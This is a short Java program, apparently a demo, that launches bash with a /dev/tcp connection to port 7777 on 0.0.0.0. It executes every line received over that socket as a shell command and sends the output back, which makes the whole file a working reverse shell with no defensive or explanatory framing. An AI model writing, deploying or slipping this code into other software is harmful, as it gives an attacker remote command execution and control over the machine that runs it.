public class JavaRevShellDemo {
   public static void main(String[] args) {
      try {

         String[] cmdArray = new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/0.0.0.0/7777;cat <&5 | while read line; do $line 2>&5 >&5; done"};
         Process process = Runtime.getRuntime().exec(cmdArray,null);

      } catch (Exception ex) {
         ex.printStackTrace();
      }
   }
}
